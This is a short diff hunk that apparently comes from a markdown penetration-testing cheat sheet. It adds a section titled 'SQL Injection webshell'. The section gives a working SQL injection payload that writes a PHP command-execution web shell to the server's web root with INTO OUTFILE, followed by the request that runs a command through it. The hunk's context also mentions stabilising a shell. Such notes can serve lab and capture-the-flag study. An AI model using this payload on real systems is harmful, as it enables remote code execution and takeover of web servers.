@@ -274,6 +274,17 @@ dv.paragraph("```bash\n" + command + "\n```");
 ```
 
 ---
+
+## SQL Injection webshell
+
+```
+High' UNION SELECT '<?php echo system($_GET["cmd"]);' INTO OUTFILE '/srv/http/cmd.php'; --
+```
+
+/cmd.php?cmd=id
+
+---
+
 # 🎯 Step 3 — Stabilize the Shell
 
 Once connected:
